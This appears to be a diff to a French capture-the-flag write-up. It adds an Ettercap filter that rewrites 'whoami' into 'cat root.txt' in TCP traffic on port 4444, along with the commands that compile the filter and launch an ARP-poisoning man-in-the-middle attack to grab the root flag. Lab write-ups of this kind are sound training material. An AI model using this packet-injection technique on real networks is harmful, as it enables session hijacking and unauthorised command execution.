@@ -61,6 +61,16 @@ La phase finale ! Alice avait un accès distant (Reverse Shell) sur le serveur d
 ![flag](/images/2026-03-18-20-32-39.png)
 
 - **Création du filtre (`whoami.ecf`)** : Écriture d'un script demandant à Ettercap de remplacer la chaîne de caractères "whoami" par "cat root.txt" dans les paquets TCP transitant sur le port 4444.
+
+```sh
+if (ip.proto == TCP && tcp.src == 4444) {
+    if (search(DATA.data, "whoami")) {
+        replace("whoami", "cat root.txt");
+        msg("P4WND ! Commande whoami interceptée et modifiée\n");
+    }
+}
+```
+
 - **`etterfilter whoami.ecf -o whoami.ef`** : Compilation du filtre texte en un fichier lisible par Ettercap.
 - **`sudo ettercap -T -i eth1 -M arp -F whoami.ef`** : Lancement de l'attaque MITM finale avec le filtre activé (`-F`), forçant l'affichage du flag `root.txt` dans la console d'écoute `tcpdump` !
 
